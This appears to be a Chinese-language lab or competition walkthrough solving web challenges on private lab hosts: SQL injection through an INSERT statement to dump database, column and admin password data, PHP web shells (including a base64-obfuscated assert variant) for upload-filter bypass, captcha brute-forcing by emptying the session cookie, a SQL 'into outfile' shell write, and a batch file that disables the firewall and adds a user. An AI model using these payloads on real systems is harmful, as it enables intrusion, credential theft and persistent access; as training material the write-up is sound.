![image-20241126150951524](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126150951524.png)

添加一项后，新发表的文章没有更新，证明**最后一个字段是usename校验**

```
语法    insert into artical(title,...,content,usename)value('aa','aa','aa')#
```

但是usename之前不知道有几个字段，即前引号不受控制，content不能作为注入点

![image-20241126152316660](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126152316660.png)

usename不是回显点，不能在该页面输出，因此也不能作为注入点

继续验证title字段

```
title=zzz','aaa','a')#&content=aaa       成功

语法    insert into artical(..,title,content,usename)value(...,'zzz','aaa','a')#
```

![image-20241126153208615](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126153208615.png)

证明**title是倒数第三个字段**

即    `title=title,contnet,username#&content=aaa`, 其中content可作为**注入点**

```
title=zzz',database(),'a')#&content=aaa     执行成功
```

爆数据库名

![image-20241126154612526](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126154612526.png)

爆表时失败，是因为对**+没有替换为空格**

![image-20241126155016110](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126155016110.png)

使用插件进行爆表名、列名

```
SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x757365727331
```

最后数据爆破，可以直接爆password

![image-20241126160428547](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126160428547.png)

也可以爆admin用户的password

```
SELECT password FROM 2web.users1 WHERE username=‘admin’
```

![image-20241126161520496](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126161520496.png)

#### 方式二：注释过滤，insert构造多条语句插入，使用')或者'(进行后闭合

insert into artical(...,title,content,usename)value(...,'zzz','aaa','a'),('',...,'','','')

insert into artical(...,title,content,usename)value(...,'**`','',''),('`**',...,'','')

因为title之前有几个字段未知，所以在后闭合中对于前面是否有字段要进行碰撞

![image-20241126165349230](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126165349230.png)

第一次碰撞失败，给title之前加一列`‘’`继续

![image-20241126164801256](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126164801256.png)

第二次碰撞成功，即一共是四个字段

接下来和之前一样进行数据库的爆破即可获得key

![image-20241126165604968](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126165604968.png)

### 34012 文件上传

![image-20241126165749801](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126165749801.png)

上传逻辑

http://11.1.10.12:34012/vulnerabilities/pic.jpg

此题过滤点：eval关键字、php后缀

补充木马：

```
<?php assert($_POST['x']); ?>
```

```
<?php 
$z=base64_decode('YXNzZXJ0');$z=($_POST['x']);
?>

//YXNzZXJ0这里是assert的base64编码，但是不能替换为eval的编码，关键字不能进行编码调用！！！
```

- 区别：
  函数：assert、preg-replace、base64_decode
  关键字：eval、if、echo、inclide

### 34015 验证码爆破

![image-20241126173337002](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126173337002.png)



**空身份认证信息对应空验证码**

![image-20241126173848226](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126173848226.png)

抓包发送至攻击器

![image-20241127200235112](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241127200235112.png)

**删cookie、**即sessionid=空，整行删除**不留换行**

**删code=的内容 **    即code=空 

**只保留password变量**

进行爆破

![image-20241126180125824](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126180125824.png)

## 真题（综合）

### 11.1.10.71-76

一、basic认证爆破，KEY6:8dn39sqx

二、

-   直接爆破用户名密码
-   bp目录爆破(①变量包含/，②取消URL编码防止/转义)，robots文件包含.sql文件直接拼接访问，查找admin找到MD5加密密文，使用MD5爆破工具爆破密码，得到密码登入

图片上传，利用401 (Hearer中提交basic信息）认证蚁剑登录服务器，网站根目录下，key7:new4e7qs

三、上传3389.bat，开启远程访问，关闭防火墙，新建账号密码————回收站恢复文件

![image-20241126210647486](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126210647486.png)



```
3389.bat

netsh firewall set opmode disable

net user xxx xxx
```

### 11.1.10.81-86

一、ip、端口扫描

二、爆破用户名密码，在单个变量中自定义进行爆破

![image-20241126223858681](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126223858681.png)

![image-20241127223834078](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241127223834078.png)

三、静态页面伪造`/xxx`爆破目录，robots得到key6和/news/禁访目录

![image-20241126224336437](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126224336437.png)

![image-20241126224943234](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126224943234.png)

![image-20241126225108302](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126225108302.png)

扫描/news/子目录

![image-20241126230754826](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126230754826.png)

找到相应的留言系统后台/news/phpmydamin/index.php

![image-20241126231631607](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126231631607.png)

![image-20241126232112032](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126232112032.png)

找到admin密码，先备份防止找错及时恢复原数据，

然后在数据库编辑中修改密码，执行两次MD5解密，登录成功

![image-20241126233536039](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126233536039.png)

知道绝对路径，则可以进行sql写马

```
select '<?php @eval($_POST["x"]); ?>' into outfile 'C:/wamp/www/shell.php'
```

访问http://11.1.10.83:125/shell.php成功，蚁剑连接

![image-20241126234616566](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126234616566.png)

远程登录，开启远程服务、关防火墙、改密码，得到key8

![image-20241126235617775](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126235617775.png)
